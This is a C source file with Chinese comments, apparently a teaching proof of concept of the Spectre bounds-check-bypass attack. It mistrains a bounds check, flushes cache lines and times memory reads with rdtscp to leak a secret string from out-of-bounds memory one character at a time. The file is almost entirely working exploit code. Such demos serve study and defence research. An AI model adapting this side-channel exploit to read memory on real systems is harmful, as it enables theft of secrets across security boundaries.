#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

// 待窃取的字符串
char* secret = "Veni, vidi, vici";
// 用于越界读取 secret 数据
unsigned int spy_size = 16;
uint8_t spy[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
// 用于构建 cache 驱逐集
uint8_t cache_set[256 * 512];
// 用于统计 cache hit 次数
int result[256];
// 探测输出
char *output;
// 参数
const int CACHE_HIT_THRESHOLD = 100; // cache hit threshold
const int CACHE_TIMES = 1000;       // 步骤 2~5 重复次数
const int CALL_TIMES  = 10;         // 步骤 4 重复次数

uint8_t temp = 0;

void victim_function(size_t x) {
	if (x < spy_size) {
		temp &= cache_set[spy[x] * 512];
	}
}

void probe(size_t malicious_x, int curr_idx) {
	size_t in_bound_x = 0, input_x = 0;
	size_t visit_idx = 0; // 访问 cache_hit 的下标
	size_t x_array[CALL_TIMES * 6];
	register uint64_t time1, time2;
	volatile uint8_t* visit_addr;
	unsigned int tmp = 0;
	// 清空 result，用于记录 cache hit 次数
	for (int i = 0; i < 256; ++i) {
		result[i] = 0;
	}
	// 重复 CACHE_TIMES 次，统计 cache hit 次数
	for (size_t i = 0; i < CACHE_TIMES; ++i) {
		// 清空 cache_set 的缓存状态
		for (size_t j = 0; j < 256; ++j) {
			_mm_clflush(&cache_set[j * 512]);
		}
		// 清除在缓存中的 spy_size
		_mm_clflush(&spy_size);
		// 循环使用 0 ~ 15 的 x
		in_bound_x = i & 15;
		// 初始化接下来对 spy 访问时依次需要使用的 x 值
		for (size_t j = 0; j < CALL_TIMES * 6; ++j) {
			if (j % 6 == 0) {
				x_array[j] = malicious_x;
			} else {
				x_array[j] = in_bound_x;
			}
		}
		// 循环 CALL_TIMES 次，保证成功读取敏感数据
		for (size_t j = 0; j < CALL_TIMES * 6; ++j) {
			// 延迟 100 loops
			for (volatile int z = 0; z < 100; z++) {}
			input_x = x_array[j];
			victim_function(input_x);
		}
		// 读取变量并计算时间，读取顺序打乱
		for (size_t j = 0; j < 256; ++j) {
			visit_idx = (j * 373587883 + 472882027) & 255;
			visit_addr = &cache_set[visit_idx * 512];
			time1 = __rdtscp(&tmp);
			tmp = *visit_addr;
			time2 = __rdtscp(&tmp);
			if (time2 - time1 <= CACHE_HIT_THRESHOLD && visit_idx != spy[in_bound_x]) {
				result[visit_idx]++;
			}
		}
	}
	// 获取敏感数据
	int target_idx = -1, target_cnt = -1;
	// 探测 [32, 126] 内的 ascii 字符
	for (int i = 32; i <= 126; ++i) {
		if (result[i] > target_cnt) {
			target_cnt = result[i];
			target_idx = i;
		}
	}
	output[curr_idx] = target_idx;
	printf(">>> Getting secret char -- \'%c\'\n", target_idx);
}

int main() {
	int len = strlen(secret);
	output = (char*)malloc(len);
	size_t malicious_x = (size_t)(secret - (char *)spy);
	// 提前将 cache_set 载入到 cache
	for (size_t i = 0; i < 256 * 512; i++) {
		cache_set[i] = 42;
	}
	// 逐个字符探测
	for (int i = 0; i < len; ++i) {
		probe(malicious_x++, i);
	}
	printf("Getting the whole string: \"%s\"\n", output);
	printf("The true whole string:    \"%s\"\n", secret);
}